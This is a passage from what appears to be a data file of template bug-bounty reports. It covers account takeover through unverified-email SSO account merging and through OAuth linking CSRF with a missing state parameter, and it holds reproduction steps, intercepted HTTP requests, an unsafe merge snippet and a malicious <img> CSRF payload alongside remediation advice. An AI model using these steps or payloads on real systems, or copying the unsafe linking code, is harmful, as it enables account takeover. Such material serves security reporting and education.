When the legitimate owner of that email address visits the platform later and authenticates using **Google Sign-In** or **Okta SSO**, the backend automatically links the external SSO identity to the pre-existing account without invalidating the attacker's pre-set password or terminating active sessions.

As a consequence, the attacker maintains persistent, invisible backdoor access to the victim's account, personal information, and cloud resources.

---

## Step-by-Step Reproduction:
1. **Attacker Action:**
   - Navigate to \`https://app.target.com/signup\`.
   - Register an account using the victim's email address (\`victim@enterprise.com\`) and password \`AttackerPass999!\`.
   - The application does not require clicking a confirmation email to create the account.

2. **Victim Action (Later in time):**
   - The legitimate victim visits \`https://app.target.com/login\`.
   - The victim clicks **Sign in with Google** using their verified \`victim@enterprise.com\` Google Workspace account.
   - The system recognizes the email, logs the victim in, and silently merges the Google identity with the pre-existing account.

3. **Attacker Exploitation:**
   - The attacker opens an incognito window and navigates to \`https://app.target.com/login\`.
   - The attacker enters \`victim@enterprise.com\` and the password they set in Step 1 (\`AttackerPass999!\`).
   - The attacker successfully logs in as the victim. Any documents, files, or sensitive actions performed by the victim are fully accessible.

---

## Technical Cause:
The authentication controller executes an unsafe identity link:
\`\`\`javascript
// Unsafe account merge
const user = await db.findUserByEmail(googleProfile.email);
if (user) {
  user.googleId = googleProfile.id; // Links Google without checking if local email was verified!
  await user.save();
}
\`\`\`

---

## Impact:
- Complete Account Takeover of any user who signs in via Google SSO.
- Zero user awareness: no notification email is triggered informing the victim that their account has a local password attached.

---

## Remediation:
1. **Mandatory Verification Before Association:** Never merge an external identity into an account unless the existing account's email has already been verified via an email confirmation link.
2. **Require Re-Authentication:** If an account was created via password and a user attempts to link Google SSO for the first time, require them to authenticate with their password first to confirm ownership.
3. **Invalidate Passwords on Conflict:** If unverified accounts exist, either purge them after 24 hours or require a password reset before linking external providers.`,
  },
  {
    id: "rep-oauth-account-linking-csrf",
    title: {
      en: "Account Takeover via OAuth Account Linking CSRF (Missing State Parameter)",
      simple: "Account Takeover via Missing State Parameter in Social Linking",
      hi: "State पैरामीटर न होने से OAuth CSRF द्वारा फुल अकाउंट टेकओवर",
    },
    vulnType: "CWE-352: Cross-Site Request Forgery (CSRF) in OAuth Flow",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (8.8 - High)",
    severity: "high",
    reportMarkdown: `## Summary:
The 'Connect Google Account' functionality located in \`https://app.target.com/settings/integrations\` fails to implement a unique, session-bound \`state\` parameter in the OAuth authorization flow.

An attacker can initiate the OAuth linking process for their own Google account, intercept the authorization callback URL containing the one-time authorization code, and induce an authenticated victim to access this callback URL. When the victim visits the link, the attacker's Google identity becomes irrevocably linked to the victim's account.

The attacker can then log into the victim's account at will by clicking 'Sign in with Google' on the main login screen.

---

## Step-by-Step Reproduction:
1. Attacker logs into Target Account A and visits \`https://app.target.com/settings\`.
2. Attacker clicks **Connect Google**.
3. In Burp Suite, observe the authorization URL:
   \`\`\`http
   GET /o/oauth2/v2/auth?client_id=123.apps.googleusercontent.com&redirect_uri=https://app.target.com/auth/google/callback&response_type=code&scope=email HTTP/1.1
   \`\`\`
   Notice that the \`state\` parameter is completely missing.
4. Attacker signs in with their Google account (\`attacker@gmail.com\`).
5. Burp intercepts the callback:
   \`\`\`http
   GET /auth/google/callback?code=4/0AY0e-g... HTTP/1.1
   Host: app.target.com
   \`\`\`
6. Attacker does **NOT** forward this request. Instead, they copy the full URL and drop the request in Burp.
7. Attacker crafts a malicious HTML page:
   \`\`\`html
   <img src="https://app.target.com/auth/google/callback?code=4/0AY0e-g...">
   \`\`\`
8. When an authenticated victim views the page, their browser requests the callback with their own session cookie.
9. Result: \`attacker@gmail.com\` is now linked to the victim's profile.
10. Attacker goes to \`https://app.target.com/login\`, clicks **Sign in with Google**, logs in as \`attacker@gmail.com\`, and is immediately authenticated as the victim.

---

## Remediation:
- Generate a cryptographically secure, unpredictable \`state\` parameter for every OAuth initiation.
- Store the state in a secure, HttpOnly, SameSite=Lax cookie or session storage.
- Reject the callback request if the returned \`state\` parameter is missing or does not strictly match the user's active session.`,
  },
];
